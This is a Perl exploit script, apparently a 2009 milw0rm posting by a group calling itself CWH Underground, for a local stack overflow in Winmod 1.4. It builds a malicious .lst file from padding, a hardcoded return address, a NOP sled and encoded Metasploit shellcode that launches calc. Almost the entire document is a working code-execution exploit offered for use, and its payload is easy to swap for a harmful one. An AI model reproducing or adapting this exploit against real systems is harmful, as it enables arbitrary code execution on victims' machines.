#!/usr/bin/perl
#
# Winmod 1.4 (.lst) Local Stack Overflow Exploit
# Exploit by CWH Underground
# Tested on Win XP SP2 EN
#
# Download: http://www.software112.com/products/winmod+download.html
#

print "\n==================================================\n";
print "    Winmod 1.4 (.lst) Local Stack Overflow Exploit \n";
print " \n";
print "         Discovered By CWH Underground \n";
print "==================================================\n";
print "                                              \n";
print "  ,--^----------,--------,-----,-------^--,   \n";
print "  | |||||||||   `--------'     |          O    \n";
print "  `+---------------------------^----------|   \n";
print "    `\_,-------, _________________________|   \n";
print "      / XXXXXX /`|     /                      \n";
print "     / XXXXXX /  `\   /                       \n";
print "    / XXXXXX /\______(                        \n";
print "   / XXXXXX /                                 \n";
print "  / XXXXXX /   .. CWH Underground Hacking Team ..  \n";
print " (________(                                   \n";
print "  `------'                                    \n";
print "                                              \n";

## win32_exec -  EXITFUNC=seh CMD=calc Size=343 Encoder=PexAlphaNum http://metasploit.com
my $shellcode="\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x49\x49\x49\x49\x49\x49".
"\x49\x49\x49\x49\x37\x49\x49\x49\x49\x49\x49\x49\x51\x5a\x6a\x41".
"\x58\x50\x30\x42\x31\x41\x42\x6b\x42\x41\x51\x32\x42\x42\x32\x41".
"\x41\x30\x41\x41\x42\x58\x38\x42\x42\x50\x75\x4b\x59\x4b\x4c\x59".
"\x78\x52\x64\x63\x30\x65\x50\x53\x30\x4e\x6b\x57\x35\x77\x4c\x6c".
"\x4b\x61\x6c\x63\x35\x73\x48\x67\x71\x48\x6f\x6e\x6b\x50\x4f\x45".
"\x48\x6e\x6b\x53\x6f\x61\x30\x73\x31\x38\x6b\x53\x79\x4e\x6b\x66".
"\x54\x6e\x6b\x46\x61\x38\x6e\x30\x31\x6b\x70\x6e\x79\x6e\x4c\x4f".
"\x74\x79\x50\x74\x34\x44\x47\x4f\x31\x59\x5a\x76\x6d\x55\x51\x59".
"\x52\x68\x6b\x4a\x54\x35\x6b\x71\x44\x65\x74\x37\x74\x31\x65\x4a".
"\x45\x6e\x6b\x73\x6f\x44\x64\x55\x51\x4a\x4b\x50\x66\x4c\x4b\x44".
"\x4c\x30\x4b\x6e\x6b\x53\x6f\x37\x6c\x46\x61\x58\x6b\x6c\x4b\x77".
"\x6c\x6e\x6b\x46\x61\x5a\x4b\x4f\x79\x31\x4c\x47\x54\x37\x74\x6a".
"\x63\x74\x71\x59\x50\x70\x64\x6e\x6b\x51\x50\x50\x30\x6e\x65\x4b".
"\x70\x72\x58\x64\x4c\x6c\x4b\x71\x50\x56\x6c\x4e\x6b\x52\x50\x57".
"\x6c\x6c\x6d\x4c\x4b\x63\x58\x73\x38\x5a\x4b\x45\x59\x4e\x6b\x4f".
"\x70\x4c\x70\x35\x50\x43\x30\x63\x30\x4c\x4b\x53\x58\x77\x4c\x73".
"\x6f\x56\x51\x48\x76\x53\x50\x66\x36\x4f\x79\x39\x68\x6f\x73\x39".
"\x50\x61\x6b\x30\x50\x61\x78\x4a\x50\x6c\x4a\x73\x34\x33\x6f\x45".
"\x38\x6d\x48\x49\x6e\x6c\x4a\x46\x6e\x76\x37\x69\x6f\x48\x67\x45".
"\x33\x73\x51\x72\x4c\x71\x73\x63\x30\x41";

my $buf="\x41" x 500;
$buf = $buf."\x68\xD5\x85\x7C";
$buf = $buf.("\x90" x 12);
$buf = $buf.$shellcode;
$buf = $buf."\x2E".("\x41"x9);

open(FILE,'>cwh_xpl.lst') or die ("[+] Error: cannot open destination file\n");
print FILE $buf;
close (FILE);

print "[+] Create exploit file successful\n";
print "[+] File's name is cwh_xpl.lst\n";

#####################################################################
#Greetz	     : ZeQ3uL, JabAv0C, p3lo, Sh0ck, BAD $ectors, Snapter, Conan, Win7dos, Gdiupo, GnuKDE, JK
#Special Thx : asylu3, str0ke, citec.us, milw0rm.com
#####################################################################

# milw0rm.com [2009-07-23]